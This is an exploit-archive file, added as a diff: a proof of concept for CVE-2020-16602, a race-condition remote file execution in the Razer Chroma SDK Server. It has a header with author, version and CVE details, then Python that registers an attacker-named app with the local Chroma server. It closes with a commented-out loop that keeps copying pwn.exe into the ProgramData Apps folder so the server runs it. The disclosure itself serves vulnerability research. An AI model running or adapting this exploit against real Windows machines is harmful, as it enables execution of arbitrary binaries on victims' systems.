@@ -1,0 +1,119 @@
+Exploit Title: Razer Chroma SDK Server 3.16.02 - Race Condition Remote File Execution
+Date: 2020-08-13
+Exploit Author: Loke Hui Yi
+Vendor Homepage: https://razerid.razer.com
+Software Link: http://rzr.to/synapse-3-pc-download
+Version: <= v3.12.17
+Tested on: Windows 10
+CVE: CVE-2020-16602
+
+# More info can be found here: 
+# https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html
+# https://www.youtube.com/watch?v=fkESBVhIdIA
+
+# Remote attackers can register applications to the Chroma Server. If the attacker has write access to the ProgramData folder where the Chroma Server stores its data, he can exploit a race condition and get the server to execute a binary of his choosing.
+
+# The code below registers an application to the Chroma Server using a name of the attacker's choosing. 
+
+# The attacker will need to pre-create a folder with the same name as the application to be registered in Razer Chroma SDK\Apps\<appname>, and create an exe file with the same application's name in that folder. The Apps folder is user writable and does not require admin privileges.
+
+# The attacker can keep running the code below to get the Server to execute the file while writing  the payload to the target directory with another process (eg samba or ftp) in order to exploit the race condition.
+
+import requests
+import json
+
+
+def heartbeat(uri):
+    print(uri + '/heartbeat')
+    r = requests.put(uri + '/heartbeat', verify=False)
+    print(r.text)
+
+def keyboard(uri):
+    data = {
+        "effect":"CHROMA_CUSTOM_KEY",
+        "param":{
+            "color":[
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535],
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535],
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535],
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535],
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535],
+                [255, 255, 255, 255, 255, 65280, 65280, 65280, 65280, 65280, 16711680, 16711680, 16711680, 16711680, 16711680, 16776960, 16776960, 16776960, 65535, 65535, 65535, 65535]
+            ],
+            "key":[
+                [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                [0, 0, 0, (16777216 | ~255), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                [0, 0, (16777216 | ~255), (16777216 | ~255), (16777216 | ~255), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (16777216 | ~16776960), 0, 0, 0, 0, 0],
+                [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (16777216 | ~16776960), (16777216 | ~16776960), (16777216 | ~16776960), 0, 0, 0, 0]
+            ]
+        }
+    }
+    print(uri + '/keyboard')
+    r = requests.put(uri + '/keyboard', json=data, verify=False)
+    print(r.text)
+
+text="a"
+
+for x in range(20000):
+    text += "a"
+
+pload = {
+    "title": "APPNAME",
+    "description": "description",
+    "author": {
+        "name": "name",
+        "contact": "contact"
+    },
+    "device_supported": [
+        "keyboard",
+        "mouse",
+        "headset",
+        "mousepad",
+        "keypad",
+        "chromalink"],
+    "category": "application"
+}
+server = 'https://chromasdk.io:54236/razer/chromasdk'
+r = requests.post(server, json=pload, verify=False)
+
+json_data = json.loads(r.text)
+
+print(json_data)
+uri = json_data['uri']
+
+heartbeat(uri)
+
+#uri = 'https://chromasdk.io:54236/sid=58487'
+heartbeat(uri)
+
+keyboard(uri)
+
+
+print (json_data['sessionid'])
+
+do_heartbeat = False
+
+if do_heartbeat:
+    sid = 1
+    uri = 'https://chromasdk.io:54236/sid=' + sid
+    heartbeat(uri)
+
+# PoC loop.py for race test
+'''
+import requests
+
+def copyfile(src, dst):
+    with open(src, 'rb') as fsrc:
+        with open(dst, 'wb') as fdst:
+            content = fsrc.read()
+            fdst.write(content)
+
+while True:
+    try:
+        print("copying")
+        copyfile('pwn.exe', 'C:\\ProgramData\\Razer Chroma SDK\\Apps\\pwn\\pwn.exe')
+    except Exception as e:
+        print(str(e))
+'''
